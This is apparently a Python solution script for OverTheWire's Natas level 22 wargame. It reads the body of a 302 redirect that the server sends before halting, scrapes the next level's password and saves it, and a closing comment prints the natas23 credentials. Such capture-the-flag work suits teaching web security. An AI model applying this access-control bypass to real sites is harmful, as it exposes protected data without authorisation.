from bs4 import BeautifulSoup
import requests
import re

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    #prevent the redirect. Or rather, inspect the redirect contents since the script still executes
    soup = BeautifulSoup(res.history[0].text, 'html.parser')
    return (res, soup)

def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())



lvl = '22'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)

my_cookies = {"PHPSESSID":'kij2rv5fvgd4v22ekal24idbj7'}
my_params = {"revelio":"true","admin":"1","debug":"true"}

res, soup = make()
pw = re.search(r"Password: [a-zA-Z0-9]{32}", soup.find("div",id="content").text)[0][10:]
open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)

writeResponse()

'''
The PHP header function with location sends a 302 code that the browser redirects,
but the script still executes. And since it's the BROWSER redirecting, it's just a simple
case of making it not do that.

Username: natas23
Password: qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj
'''
